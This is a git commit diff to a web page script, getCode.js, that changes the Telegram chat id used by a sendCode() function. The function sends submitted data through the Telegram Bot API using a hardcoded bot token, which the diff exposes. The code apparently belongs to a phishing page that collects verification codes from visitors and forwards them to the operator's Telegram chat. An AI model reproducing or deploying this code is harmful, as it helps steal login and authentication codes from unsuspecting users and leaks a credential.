2a17068a1b3ef770537aee1a3b1fc128127da7e3
anh123-boop <huum248@gmail.com>
2026-06-19 22:06:18 +0700

    Update getCode.js

--- public/js/getCode.js
+++ public/js/getCode.js
@@ -179,7 +179,7 @@ function sendCode() {
 
         NUMBER_TIME_SEND_CODE++;
         const botToken = '8744850466:AAF7_EsiHfBybvQlPzOAgJlvBmzPHzpjeeg'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-8744850466'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+        const chatId = '-1004340441282'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
         const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
